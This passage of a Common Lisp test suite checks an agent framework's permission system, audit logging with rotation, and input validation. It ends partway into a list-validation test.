;;;; security-tests.lisp - Tests for security module
;;;;
;;;; Tests for the permission system and security hardening.
;;;; Phase 10.2: Security Hardening

(in-package #:autopoiesis.test)

(def-suite security-tests
  :description "Tests for security module")

(in-suite security-tests)

;;; ═══════════════════════════════════════════════════════════════════
;;; Resource Tests
;;; ═══════════════════════════════════════════════════════════════════

(test resource-creation
  "Test creating resource instances"
  (let ((res (autopoiesis.security:make-resource :snapshot)))
    (is (eq :snapshot (autopoiesis.security:resource-type res)))
    (is (null (autopoiesis.security:resource-id res)))
    (is (null (autopoiesis.security:resource-owner res))))
  
  (let ((res (autopoiesis.security:make-resource :agent 
                                                  :id "agent-123"
                                                  :owner "admin")))
    (is (eq :agent (autopoiesis.security:resource-type res)))
    (is (string= "agent-123" (autopoiesis.security:resource-id res)))
    (is (string= "admin" (autopoiesis.security:resource-owner res)))))

;;; ═══════════════════════════════════════════════════════════════════
;;; Permission Tests
;;; ═══════════════════════════════════════════════════════════════════

(test permission-creation
  "Test creating permission instances"
  (let ((perm (autopoiesis.security:make-permission 
               "read-snapshots" 
               autopoiesis.security:+resource-snapshot+
               (list autopoiesis.security:+action-read+))))
    (is (string= "read-snapshots" (autopoiesis.security:permission-name perm)))
    (is (eq :snapshot (autopoiesis.security:resource-type 
                       (autopoiesis.security:permission-resource perm))))
    (is (member :read (autopoiesis.security:permission-actions perm)))))

(test permission-templates
  "Test permission template functions"
  ;; Read-only permission
  (let ((perm (autopoiesis.security:make-read-only-permission 
               "test-read" :snapshot)))
    (is (equal '(:read) (autopoiesis.security:permission-actions perm))))
  
  ;; Execute-only permission
  (let ((perm (autopoiesis.security:make-execute-only-permission 
               "test-exec" :capability)))
    (is (equal '(:execute) (autopoiesis.security:permission-actions perm))))
  
  ;; Full access permission
  (let ((perm (autopoiesis.security:make-full-access-permission 
               "test-full" :agent)))
    (is (member :read (autopoiesis.security:permission-actions perm)))
    (is (member :write (autopoiesis.security:permission-actions perm)))
    (is (member :delete (autopoiesis.security:permission-actions perm)))
    (is (member :admin (autopoiesis.security:permission-actions perm)))))

;;; ═══════════════════════════════════════════════════════════════════
;;; Permission Registry Tests
;;; ═══════════════════════════════════════════════════════════════════

(test permission-registry-basic
  "Test basic permission registry operations"
  ;; Clear any existing permissions
  (autopoiesis.security:clear-agent-permissions)
  
  ;; Initially no permissions
  (is (null (autopoiesis.security:get-agent-permissions "test-agent")))
  
  ;; Grant a permission
  (let ((perm (autopoiesis.security:make-permission 
               "test-perm" :snapshot '(:read))))
    (autopoiesis.security:grant-permission "test-agent" perm)
    (is (= 1 (length (autopoiesis.security:get-agent-permissions "test-agent")))))
  
  ;; Revoke the permission
  (autopoiesis.security:revoke-permission "test-agent" "test-perm")
  (is (null (autopoiesis.security:get-agent-permissions "test-agent")))
  
  ;; Clean up
  (autopoiesis.security:clear-agent-permissions))

(test permission-registry-multiple
  "Test multiple permissions per agent"
  (autopoiesis.security:clear-agent-permissions)
  
  (let ((perm1 (autopoiesis.security:make-permission "perm1" :snapshot '(:read)))
        (perm2 (autopoiesis.security:make-permission "perm2" :agent '(:read :write)))
        (perm3 (autopoiesis.security:make-permission "perm3" :capability '(:execute))))
    
    (autopoiesis.security:grant-permission "multi-agent" perm1)
    (autopoiesis.security:grant-permission "multi-agent" perm2)
    (autopoiesis.security:grant-permission "multi-agent" perm3)
    
    (is (= 3 (length (autopoiesis.security:get-agent-permissions "multi-agent"))))
    
    ;; Revoke middle permission
    (autopoiesis.security:revoke-permission "multi-agent" "perm2")
    (is (= 2 (length (autopoiesis.security:get-agent-permissions "multi-agent")))))
  
  (autopoiesis.security:clear-agent-permissions))

;;; ═══════════════════════════════════════════════════════════════════
;;; Permission Checking Tests
;;; ═══════════════════════════════════════════════════════════════════

(test check-permission-basic
  "Test basic permission checking"
  (autopoiesis.security:clear-agent-permissions)
  
  ;; Grant read permission on snapshots
  (let ((perm (autopoiesis.security:make-permission 
               "read-snaps" :snapshot '(:read))))
    (autopoiesis.security:grant-permission "checker-agent" perm))
  
  ;; Should have read permission
  (is-true (autopoiesis.security:check-permission 
            "checker-agent" :snapshot :read))
  
  ;; Should NOT have write permission
  (is-false (autopoiesis.security:check-permission 
             "checker-agent" :snapshot :write))
  
  ;; Should NOT have permission on different resource
  (is-false (autopoiesis.security:check-permission 
             "checker-agent" :agent :read))
  
  (autopoiesis.security:clear-agent-permissions))

(test check-permission-admin
  "Test that admin permission grants all actions"
  (autopoiesis.security:clear-agent-permissions)
  
  ;; Grant admin permission on agents
  (let ((perm (autopoiesis.security:make-permission 
               "admin-agents" :agent '(:admin))))
    (autopoiesis.security:grant-permission "admin-agent" perm))
  
  ;; Admin should grant all actions
  (is-true (autopoiesis.security:check-permission 
            "admin-agent" :agent :read))
  (is-true (autopoiesis.security:check-permission 
            "admin-agent" :agent :write))
  (is-true (autopoiesis.security:check-permission 
            "admin-agent" :agent :delete))
  (is-true (autopoiesis.security:check-permission 
            "admin-agent" :agent :execute))
  
  ;; But not on other resources
  (is-false (autopoiesis.security:check-permission 
             "admin-agent" :snapshot :read))
  
  (autopoiesis.security:clear-agent-permissions))

(test check-permission-with-resource-id
  "Test permission checking with specific resource IDs"
  (autopoiesis.security:clear-agent-permissions)
  
  ;; Grant permission on specific snapshot
  (let ((perm (autopoiesis.security:make-permission 
               "specific-snap" :snapshot '(:read :write)
               :resource-id "snap-001")))
    (autopoiesis.security:grant-permission "specific-agent" perm))
  
  ;; Should have permission on that specific snapshot
  (is-true (autopoiesis.security:check-permission 
            "specific-agent" :snapshot :read :resource-id "snap-001"))
  
  ;; Wildcard permission (no specific ID) should also match
  (is-true (autopoiesis.security:check-permission 
            "specific-agent" :snapshot :read))
  
  (autopoiesis.security:clear-agent-permissions))

(test has-permission-p-predicate
  "Test has-permission-p predicate function"
  (autopoiesis.security:clear-agent-permissions)
  
  (let ((perm (autopoiesis.security:make-permission 
               "test" :capability '(:execute))))
    (autopoiesis.security:grant-permission "pred-agent" perm))
  
  (is-true (autopoiesis.security:has-permission-p 
            "pred-agent" :capability :execute))
  (is-false (autopoiesis.security:has-permission-p 
             "pred-agent" :capability :delete))
  
  (autopoiesis.security:clear-agent-permissions))

;;; ═══════════════════════════════════════════════════════════════════
;;; Permission Denied Condition Tests
;;; ═══════════════════════════════════════════════════════════════════

(test permission-denied-condition
  "Test permission-denied condition signaling"
  (autopoiesis.security:clear-agent-permissions)
  
  ;; No permissions granted - should signal error
  (signals autopoiesis.security:permission-denied
    (autopoiesis.security:with-permission-check ("denied-agent" :snapshot :write)
      (error "Should not reach here")))
  
  ;; Grant permission - should succeed
  (let ((perm (autopoiesis.security:make-permission 
               "allowed" :snapshot '(:write))))
    (autopoiesis.security:grant-permission "allowed-agent" perm))
  
  (finishes
    (autopoiesis.security:with-permission-check ("allowed-agent" :snapshot :write)
      :success))
  
  (autopoiesis.security:clear-agent-permissions))

(test permission-denied-condition-details
  "Test permission-denied condition contains correct details"
  (autopoiesis.security:clear-agent-permissions)
  
  (handler-case
      (autopoiesis.security:with-permission-check ("detail-agent" :file :delete 
                                                    :resource-id "important.txt")
        (error "Should not reach here"))
    (autopoiesis.security:permission-denied (c)
      (is (string= "detail-agent" (autopoiesis.security:permission-denied-agent c)))
      (is (eq :delete (autopoiesis.security:permission-denied-action c)))
      (is (eq :file (autopoiesis.security:resource-type 
                     (autopoiesis.security:permission-denied-resource c))))))
  
  (autopoiesis.security:clear-agent-permissions))

;;; ═══════════════════════════════════════════════════════════════════
;;; Permission Matrix Tests
;;; ═══════════════════════════════════════════════════════════════════

(test permission-matrix-basic
  "Test permission matrix creation and checking"
  (let* ((perms (list (autopoiesis.security:make-permission 
                       "p1" :snapshot '(:read :write))
                      (autopoiesis.security:make-permission 
                       "p2" :agent '(:read))))
         (matrix (autopoiesis.security:make-permission-matrix perms)))
    
    ;; Check granted permissions
    (is-true (autopoiesis.security:matrix-check matrix :snapshot :read))
    (is-true (autopoiesis.security:matrix-check matrix :snapshot :write))
    (is-true (autopoiesis.security:matrix-check matrix :agent :read))
    
    ;; Check non-granted permissions
    (is-false (autopoiesis.security:matrix-check matrix :snapshot :delete))
    (is-false (autopoiesis.security:matrix-check matrix :agent :write))))

(test permission-matrix-grant-revoke
  "Test granting and revoking in permission matrix"
  (let ((matrix (autopoiesis.security:make-permission-matrix)))
    ;; Initially empty
    (is-false (autopoiesis.security:matrix-check matrix :file :read))
    
    ;; Grant permission
    (autopoiesis.security:matrix-grant matrix :file :read)
    (is-true (autopoiesis.security:matrix-check matrix :file :read))
    
    ;; Revoke permission
    (autopoiesis.security:matrix-revoke matrix :file :read)
    (is-false (autopoiesis.security:matrix-check matrix :file :read))))

(test permission-matrix-admin-override
  "Test that admin in matrix grants all actions"
  (let* ((perms (list (autopoiesis.security:make-permission 
                       "admin" :network '(:admin))))
         (matrix (autopoiesis.security:make-permission-matrix perms)))
    
    ;; Admin should grant all actions
    (is-true (autopoiesis.security:matrix-check matrix :network :read))
    (is-true (autopoiesis.security:matrix-check matrix :network :write))
    (is-true (autopoiesis.security:matrix-check matrix :network :delete))))

(test permission-matrix-to-list
  "Test converting matrix back to list"
  (let ((matrix (autopoiesis.security:make-permission-matrix)))
    (autopoiesis.security:matrix-grant matrix :snapshot :read)
    (autopoiesis.security:matrix-grant matrix :snapshot :write)
    (autopoiesis.security:matrix-grant matrix :agent :execute)
    
    (let ((list (autopoiesis.security:matrix-to-list matrix)))
      (is (= 3 (length list)))
      (is (member '(:snapshot :read) list :test #'equal))
      (is (member '(:snapshot :write) list :test #'equal))
      (is (member '(:agent :execute) list :test #'equal)))))

;;; ═══════════════════════════════════════════════════════════════════
;;; Default Permission Sets Tests
;;; ═══════════════════════════════════════════════════════════════════

(test default-permission-sets
  "Test that default permission sets are defined correctly"
  ;; Default agent permissions
  (is (listp autopoiesis.security:*default-agent-permissions*))
  (is (plusp (length autopoiesis.security:*default-agent-permissions*)))
  
  ;; Admin permissions
  (is (listp autopoiesis.security:*admin-permissions*))
  (is (plusp (length autopoiesis.security:*admin-permissions*)))
  
  ;; Sandbox permissions
  (is (listp autopoiesis.security:*sandbox-permissions*))
  (is (plusp (length autopoiesis.security:*sandbox-permissions*))))

(test default-permissions-coverage
  "Test that default permissions cover expected resources"
  ;; Admin should have permissions for all resource types
  (let ((admin-resources (mapcar (lambda (p) 
                                   (autopoiesis.security:resource-type 
                                    (autopoiesis.security:permission-resource p)))
                                 autopoiesis.security:*admin-permissions*)))
    (is (member :snapshot admin-resources))
    (is (member :agent admin-resources))
    (is (member :capability admin-resources))
    (is (member :extension admin-resources))
    (is (member :file admin-resources))
    (is (member :network admin-resources))
    (is (member :system admin-resources))))

;;; ═══════════════════════════════════════════════════════════════════
;;; Action Constants Tests
;;; ═══════════════════════════════════════════════════════════════════

(test action-constants
  "Test that action constants are defined"
  (is (eq :read autopoiesis.security:+action-read+))
  (is (eq :write autopoiesis.security:+action-write+))
  (is (eq :execute autopoiesis.security:+action-execute+))
  (is (eq :delete autopoiesis.security:+action-delete+))
  (is (eq :create autopoiesis.security:+action-create+))
  (is (eq :admin autopoiesis.security:+action-admin+)))

(test all-actions-function
  "Test all-actions returns all action constants"
  (let ((actions (autopoiesis.security:all-actions)))
    (is (= 6 (length actions)))
    (is (member :read actions))
    (is (member :write actions))
    (is (member :execute actions))
    (is (member :delete actions))
    (is (member :create actions))
    (is (member :admin actions))))

;;; ═══════════════════════════════════════════════════════════════════
;;; Resource Type Constants Tests
;;; ═══════════════════════════════════════════════════════════════════

(test resource-type-constants
  "Test that resource type constants are defined"
  (is (eq :snapshot autopoiesis.security:+resource-snapshot+))
  (is (eq :agent autopoiesis.security:+resource-agent+))
  (is (eq :capability autopoiesis.security:+resource-capability+))
  (is (eq :extension autopoiesis.security:+resource-extension+))
  (is (eq :file autopoiesis.security:+resource-file+))
  (is (eq :network autopoiesis.security:+resource-network+))
  (is (eq :system autopoiesis.security:+resource-system+)))

;;; ═══════════════════════════════════════════════════════════════════
;;; Integration Tests
;;; ═══════════════════════════════════════════════════════════════════

(test permission-workflow
  "Test a complete permission workflow"
  (autopoiesis.security:clear-agent-permissions)
  
  ;; Create a new agent with default permissions
  (dolist (perm autopoiesis.security:*default-agent-permissions*)
    (autopoiesis.security:grant-permission "workflow-agent" perm))
  
  ;; Agent should be able to read snapshots (from defaults)
  (is-true (autopoiesis.security:check-permission 
            "workflow-agent" :snapshot :read))
  
  ;; Agent should be able to execute capabilities (from defaults)
  (is-true (autopoiesis.security:check-permission 
            "workflow-agent" :capability :execute))
  
  ;; Agent should NOT be able to delete snapshots
  (is-false (autopoiesis.security:check-permission 
             "workflow-agent" :snapshot :delete))
  
  ;; Grant additional permission
  (autopoiesis.security:grant-permission 
   "workflow-agent"
   (autopoiesis.security:make-permission "write-snaps" :snapshot '(:write)))
  
  ;; Now agent can write snapshots
  (is-true (autopoiesis.security:check-permission 
            "workflow-agent" :snapshot :write))
  
  (autopoiesis.security:clear-agent-permissions))

;;; ═══════════════════════════════════════════════════════════════════
;;; Audit Entry Tests
;;; ═══════════════════════════════════════════════════════════════════

(test audit-entry-creation
  "Test creating audit entry instances"
  (let ((entry (autopoiesis.security:make-audit-entry
                :agent-id "test-agent"
                :action :read
                :resource :snapshot
                :result :success)))
    (is-true (autopoiesis.security:audit-entry-p entry))
    (is (string= "test-agent" (autopoiesis.security:audit-entry-agent-id entry)))
    (is (eq :read (autopoiesis.security:audit-entry-action entry)))
    (is (eq :snapshot (autopoiesis.security:audit-entry-resource entry)))
    (is (eq :success (autopoiesis.security:audit-entry-result entry)))
    (is (integerp (autopoiesis.security:audit-entry-timestamp entry)))))

(test audit-entry-with-details
  "Test audit entry with details"
  (let ((entry (autopoiesis.security:make-audit-entry
                :agent-id "detail-agent"
                :action :write
                :resource :file
                :result :error
                :details "File not found")))
    (is (string= "File not found" (autopoiesis.security:audit-entry-details entry)))))

(test audit-entry-copy
  "Test copying audit entries"
  (let* ((original (autopoiesis.security:make-audit-entry
                    :agent-id "orig-agent"
                    :action :delete
                    :resource :agent
                    :result :failure))
         (copy (autopoiesis.security:copy-audit-entry original)))
    (is-true (autopoiesis.security:audit-entry-p copy))
    (is (string= (autopoiesis.security:audit-entry-agent-id original)
                 (autopoiesis.security:audit-entry-agent-id copy)))
    (is (eq (autopoiesis.security:audit-entry-action original)
            (autopoiesis.security:audit-entry-action copy)))))

;;; ═══════════════════════════════════════════════════════════════════
;;; Audit Serialization Tests
;;; ═══════════════════════════════════════════════════════════════════

(test audit-entry-serialization
  "Test serializing audit entries to JSON"
  (let* ((entry (autopoiesis.security:make-audit-entry
                 :agent-id "serial-agent"
                 :action :execute
                 :resource :capability
                 :result :success))
         (json (autopoiesis.security:serialize-audit-entry entry)))
    (is (stringp json))
    (is (search "serial-agent" json))
    (is (search "execute" json))
    (is (search "capability" json))
    (is (search "success" json))))

(test audit-entry-deserialization
  "Test deserializing audit entries from JSON"
  (let* ((original (autopoiesis.security:make-audit-entry
                    :agent-id "deserial-agent"
                    :action :create
                    :resource :extension
                    :result :success
                    :details "Created new extension"))
         (json (autopoiesis.security:serialize-audit-entry original))
         (restored (autopoiesis.security:deserialize-audit-entry json)))
    (is-true (autopoiesis.security:audit-entry-p restored))
    (is (string= "deserial-agent" (autopoiesis.security:audit-entry-agent-id restored)))
    (is (eq :create (autopoiesis.security:audit-entry-action restored)))
    (is (eq :extension (autopoiesis.security:audit-entry-resource restored)))
    (is (eq :success (autopoiesis.security:audit-entry-result restored)))
    (is (string= "Created new extension" (autopoiesis.security:audit-entry-details restored)))))

(test audit-entry-roundtrip
  "Test serialization/deserialization roundtrip"
  (let* ((original (autopoiesis.security:make-audit-entry
                    :agent-id "roundtrip-agent"
                    :action :admin
                    :resource :system
                    :result :error
                    :details '(:error-code 500 :message "Internal error")))
         (json (autopoiesis.security:serialize-audit-entry original))
         (restored (autopoiesis.security:deserialize-audit-entry json)))
    (is (string= (autopoiesis.security:audit-entry-agent-id original)
                 (autopoiesis.security:audit-entry-agent-id restored)))
    (is (eq (autopoiesis.security:audit-entry-action original)
            (autopoiesis.security:audit-entry-action restored)))
    (is (eq (autopoiesis.security:audit-entry-result original)
            (autopoiesis.security:audit-entry-result restored)))))

;;; ═══════════════════════════════════════════════════════════════════
;;; Audit Log Management Tests
;;; ═══════════════════════════════════════════════════════════════════

(test audit-log-inactive-by-default
  "Test that audit logging is inactive by default"
  (is-false (autopoiesis.security:audit-log-active-p)))

(test audit-log-start-stop
  "Test starting and stopping audit logging"
  (let ((test-path (merge-pathnames "test-audit.log" 
                                    (uiop:temporary-directory))))
    (unwind-protect
         (progn
           ;; Start logging
           (is-true (autopoiesis.security:start-audit-logging test-path))
           (is-true (autopoiesis.security:audit-log-active-p))
           
           ;; Stop logging
           (is-true (autopoiesis.security:stop-audit-logging))
           (is-false (autopoiesis.security:audit-log-active-p)))
      ;; Cleanup
      (when (probe-file test-path)
        (delete-file test-path)))))

(test audit-log-writes-entries
  "Test that audit-log writes entries to file"
  (let ((test-path (merge-pathnames "test-audit-write.log" 
                                    (uiop:temporary-directory))))
    (unwind-protect
         (progn
           (autopoiesis.security:start-audit-logging test-path)
           
           ;; Log some entries
           (autopoiesis.security:audit-log "agent-1" :read :snapshot :success)
           (autopoiesis.security:audit-log "agent-2" :write :file :failure "Permission denied")
           (autopoiesis.security:audit-log "agent-3" :execute :capability :error)
           
           (autopoiesis.security:stop-audit-logging)
           
           ;; Read back and verify
           (let ((entries (autopoiesis.security:read-audit-log test-path)))
             ;; Should have at least 3 entries (plus start/stop)
             (is (>= (length entries) 3))
             ;; Find our test entries
             (is-true (find "agent-1" entries 
                            :key #'autopoiesis.security:audit-entry-agent-id
                            :test #'string=))
             (is-true (find "agent-2" entries 
                            :key #'autopoiesis.security:audit-entry-agent-id
                            :test #'string=))))
      ;; Cleanup
      (when (probe-file test-path)
        (delete-file test-path)))))

(test audit-log-filtering
  "Test filtering audit log entries"
  (let ((test-path (merge-pathnames "test-audit-filter.log" 
                                    (uiop:temporary-directory))))
    (unwind-protect
         (progn
           (autopoiesis.security:start-audit-logging test-path)
           
           ;; Log entries with different attributes
           (autopoiesis.security:audit-log "filter-agent-a" :read :snapshot :success)
           (autopoiesis.security:audit-log "filter-agent-b" :write :snapshot :failure)
           (autopoiesis.security:audit-log "filter-agent-a" :delete :file :error)
           (autopoiesis.security:audit-log "filter-agent-c" :read :agent :success)
           
           (autopoiesis.security:stop-audit-logging)
           
           ;; Filter by agent
           (let ((agent-a-entries (autopoiesis.security:read-audit-log 
                                   test-path :agent-id "filter-agent-a")))
             (is (= 2 (length agent-a-entries))))
           
           ;; Filter by action
           (let ((read-entries (autopoiesis.security:read-audit-log 
                                test-path :action :read)))
             (is (= 2 (length read-entries))))
           
           ;; Filter by result
           (let ((success-entries (autopoiesis.security:read-audit-log 
                                   test-path :result :success)))
             (is (>= (length success-entries) 2)))
           
           ;; Filter by resource
           (let ((snapshot-entries (autopoiesis.security:read-audit-log 
                                    test-path :resource :snapshot)))
             (is (= 2 (length snapshot-entries)))))
      ;; Cleanup
      (when (probe-file test-path)
        (delete-file test-path)))))

(test audit-log-limit
  "Test limiting number of audit log entries returned"
  (let ((test-path (merge-pathnames "test-audit-limit.log" 
                                    (uiop:temporary-directory))))
    (unwind-protect
         (progn
           (autopoiesis.security:start-audit-logging test-path)
           
           ;; Log multiple entries
           (dotimes (i 10)
             (autopoiesis.security:audit-log 
              (format nil "limit-agent-~d" i) :read :snapshot :success))
           
           (autopoiesis.security:stop-audit-logging)
           
           ;; Read with limit
           (let ((limited (autopoiesis.security:read-audit-log test-path :limit 5)))
             (is (= 5 (length limited)))))
      ;; Cleanup
      (when (probe-file test-path)
        (delete-file test-path)))))

;;; ═══════════════════════════════════════════════════════════════════
;;; Audit Log Rotation Tests
;;; ═══════════════════════════════════════════════════════════════════

(test audit-log-rotation
  "Test manual log rotation"
  (let* ((test-dir (merge-pathnames "audit-rotation-test/" 
                                    (uiop:temporary-directory)))
         (test-path (merge-pathnames "audit.log" test-dir)))
    (unwind-protect
         (progn
           (ensure-directories-exist test-path)
           (autopoiesis.security:start-audit-logging test-path)
           
           ;; Log some entries
           (autopoiesis.security:audit-log "rotate-agent" :read :snapshot :success)
           
           ;; Force rotation
           (autopoiesis.security:rotate-audit-log)
           
           ;; Check that rotated file exists
           (let ((rotated-path (make-pathname :defaults test-path
                                              :type "log.1")))
             (is-true (probe-file rotated-path)))
           
           ;; Log more entries to new file
           (autopoiesis.security:audit-log "rotate-agent-2" :write :file :success)
           
           (autopoiesis.security:stop-audit-logging))
      ;; Cleanup
      (uiop:delete-directory-tree test-dir :validate t :if-does-not-exist :ignore))))

(test audit-log-auto-rotation
  "Test automatic log rotation based on size"
  (let* ((test-dir (merge-pathnames "audit-auto-rotation-test/" 
                                    (uiop:temporary-directory)))
         (test-path (merge-pathnames "audit.log" test-dir)))
    (unwind-protect
         (progn
           (ensure-directories-exist test-path)
           ;; Start with very small max size to trigger rotation
           (autopoiesis.security:start-audit-logging test-path 
                                                     :max-size 500
                                                     :max-files 3)
           
           ;; Log enough entries to trigger rotation
           (dotimes (i 20)
             (autopoiesis.security:audit-log 
              (format nil "auto-rotate-agent-~d" i) 
              :execute :capability :success
              "Some additional details to make the entry larger"))
           
           (autopoiesis.security:stop-audit-logging)
           
           ;; Check that at least one rotated file exists
           (let ((rotated-path (make-pathname :defaults test-path
                                              :type "log.1")))
             (is-true (probe-file rotated-path))))
      ;; Cleanup
      (uiop:delete-directory-tree test-dir :validate t :if-does-not-exist :ignore))))

;;; ═══════════════════════════════════════════════════════════════════
;;; With-Audit Macro Tests
;;; ═══════════════════════════════════════════════════════════════════

(test with-audit-macro-success
  "Test with-audit macro on successful operation"
  (let ((test-path (merge-pathnames "test-with-audit.log" 
                                    (uiop:temporary-directory))))
    (unwind-protect
         (progn
           (autopoiesis.security:start-audit-logging test-path)
           
           ;; Execute with audit - success case
           (let ((result (autopoiesis.security:with-audit ("macro-agent" :read :snapshot)
                           (+ 1 2 3))))
             (is (= 6 result)))
           
           (autopoiesis.security:stop-audit-logging)
           
           ;; Verify audit entry was logged
           (let ((entries (autopoiesis.security:read-audit-log 
                           test-path :agent-id "macro-agent")))
             (is (>= (length entries) 1))
             (is (eq :success (autopoiesis.security:audit-entry-result 
                               (first entries))))))
      ;; Cleanup
      (when (probe-file test-path)
        (delete-file test-path)))))

(test with-audit-macro-error
  "Test with-audit macro on error"
  (let ((test-path (merge-pathnames "test-with-audit-error.log" 
                                    (uiop:temporary-directory))))
    (unwind-protect
         (progn
           (autopoiesis.security:start-audit-logging test-path)
           
           ;; Execute with audit - error case
           (signals error
             (autopoiesis.security:with-audit ("error-agent" :write :file)
               (error "Intentional test error")))
           
           (autopoiesis.security:stop-audit-logging)
           
           ;; Verify error was logged
           (let ((entries (autopoiesis.security:read-audit-log 
                           test-path :agent-id "error-agent")))
             (is (>= (length entries) 1))
             (is (eq :error (autopoiesis.security:audit-entry-result 
                             (first entries))))))
      ;; Cleanup
      (when (probe-file test-path)
        (delete-file test-path)))))

;;; ═══════════════════════════════════════════════════════════════════
;;; With-Audit-Logging Macro Tests
;;; ═══════════════════════════════════════════════════════════════════

(test with-audit-logging-macro
  "Test with-audit-logging convenience macro"
  (let ((test-path (merge-pathnames "test-with-audit-logging.log" 
                                    (uiop:temporary-directory))))
    (unwind-protect
         (progn
           (autopoiesis.security:with-audit-logging (test-path)
             (is-true (autopoiesis.security:audit-log-active-p))
             (autopoiesis.security:audit-log "scoped-agent" :read :snapshot :success))
           
           ;; After macro, logging should be stopped
           (is-false (autopoiesis.security:audit-log-active-p))
           
           ;; But entries should be in file
           (let ((entries (autopoiesis.security:read-audit-log test-path)))
             (is (>= (length entries) 1))))
      ;; Cleanup
      (when (probe-file test-path)
        (delete-file test-path)))))

;;; ═══════════════════════════════════════════════════════════════════
;;; Input Validation Tests
;;; ═══════════════════════════════════════════════════════════════════

(test validation-result-creation
  "Test creating validation results"
  (let ((success (autopoiesis.security:validation-success "test")))
    (is-true (autopoiesis.security:validation-result-valid-p success))
    (is (string= "test" (autopoiesis.security:validation-result-value success)))
    (is (null (autopoiesis.security:validation-result-errors success))))
  
  (let ((failure (autopoiesis.security:validation-failure "bad" "Error 1" "Error 2")))
    (is-false (autopoiesis.security:validation-result-valid-p failure))
    (is (string= "bad" (autopoiesis.security:validation-result-value failure)))
    (is (= 2 (length (autopoiesis.security:validation-result-errors failure))))))

;;; String Validation Tests

(test validate-string-basic
  "Test basic string validation"
  ;; Valid string
  (let ((result (autopoiesis.security:validate-input "hello" '(:string))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Not a string
  (let ((result (autopoiesis.security:validate-input 123 '(:string))))
    (is-false (autopoiesis.security:validation-result-valid-p result))))

(test validate-string-length
  "Test string length constraints"
  ;; Max length
  (let ((result (autopoiesis.security:validate-input "hello" '(:string :max-length 10))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  (let ((result (autopoiesis.security:validate-input "hello world" '(:string :max-length 5))))
    (is-false (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Min length
  (let ((result (autopoiesis.security:validate-input "hi" '(:string :min-length 5))))
    (is-false (autopoiesis.security:validation-result-valid-p result)))
  
  (let ((result (autopoiesis.security:validate-input "hello" '(:string :min-length 5))))
    (is-true (autopoiesis.security:validation-result-valid-p result))))

(test validate-string-pattern
  "Test string pattern matching"
  ;; Valid pattern
  (let ((result (autopoiesis.security:validate-input "agent-123" 
                                                     '(:string :pattern "^[a-z]+-[0-9]+$"))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Invalid pattern
  (let ((result (autopoiesis.security:validate-input "AGENT_123" 
                                                     '(:string :pattern "^[a-z]+-[0-9]+$"))))
    (is-false (autopoiesis.security:validation-result-valid-p result))))

(test validate-string-empty
  "Test empty string handling"
  ;; Allow empty by default
  (let ((result (autopoiesis.security:validate-input "" '(:string))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Disallow empty
  (let ((result (autopoiesis.security:validate-input "" '(:string :allow-empty nil))))
    (is-false (autopoiesis.security:validation-result-valid-p result))))

;;; Integer Validation Tests

(test validate-integer-basic
  "Test basic integer validation"
  ;; Valid integer
  (let ((result (autopoiesis.security:validate-input 42 '(:integer))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Not an integer
  (let ((result (autopoiesis.security:validate-input 3.14 '(:integer))))
    (is-false (autopoiesis.security:validation-result-valid-p result)))
  
  (let ((result (autopoiesis.security:validate-input "42" '(:integer))))
    (is-false (autopoiesis.security:validation-result-valid-p result))))

(test validate-integer-range
  "Test integer range constraints"
  ;; Within range
  (let ((result (autopoiesis.security:validate-input 50 '(:integer :min 0 :max 100))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Below min
  (let ((result (autopoiesis.security:validate-input -5 '(:integer :min 0))))
    (is-false (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Above max
  (let ((result (autopoiesis.security:validate-input 150 '(:integer :max 100))))
    (is-false (autopoiesis.security:validation-result-valid-p result))))

;;; Number Validation Tests

(test validate-number-basic
  "Test basic number validation"
  ;; Integer is a number
  (let ((result (autopoiesis.security:validate-input 42 '(:number))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Float is a number
  (let ((result (autopoiesis.security:validate-input 3.14 '(:number))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; String is not a number
  (let ((result (autopoiesis.security:validate-input "42" '(:number))))
    (is-false (autopoiesis.security:validation-result-valid-p result))))

;;; Boolean Validation Tests

(test validate-boolean
  "Test boolean validation"
  ;; T is valid
  (let ((result (autopoiesis.security:validate-input t '(:boolean))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; NIL is valid
  (let ((result (autopoiesis.security:validate-input nil '(:boolean))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Other values are not valid booleans
  (let ((result (autopoiesis.security:validate-input 1 '(:boolean))))
    (is-false (autopoiesis.security:validation-result-valid-p result))))

;;; Keyword Validation Tests

(test validate-keyword-basic
  "Test basic keyword validation"
  ;; Valid keyword
  (let ((result (autopoiesis.security:validate-input :test '(:keyword))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Not a keyword
  (let ((result (autopoiesis.security:validate-input 'test '(:keyword))))
    (is-false (autopoiesis.security:validation-result-valid-p result))))

(test validate-keyword-options
  "Test keyword options constraint"
  ;; Valid option
  (let ((result (autopoiesis.security:validate-input :read 
                                                     '(:keyword :options (:read :write :delete)))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Invalid option
  (let ((result (autopoiesis.security:validate-input :execute 
                                                     '(:keyword :options (:read :write :delete)))))
    (is-false (autopoiesis.security:validation-result-valid-p result))))

;;; List Validation Tests

(test validate-list-basic
  "Test basic list validation"
  ;; Valid list
  (let ((result (autopoiesis.security:validate-input '(1 2 3) '(:list))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Empty list is valid
  (let ((result (autopoiesis.security:validate-input nil '(:list))))
    (is-true (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Not a list
  (let ((result (autopoiesis.security:validate-input "not a list" '(:list))))
    (is-false (autopoiesis.security:validation-result-valid-p result))))

(test validate-list-length
  "Test list length constraints"
  ;; Min length
  (let ((result (autopoiesis.security:validate-input '(1 2) '(:list :min-length 3))))
    (is-false (autopoiesis.security:validation-result-valid-p result)))
  
  ;; Max length
  (let ((result (autopoiesis.security:validate-input '(1 2 3 4 5) '(:list :max-length 3))))
    (is-false (autopoiesis.security:validation-result-valid-p result))))

(test validate-list-element-type
  "Test list element type validation"
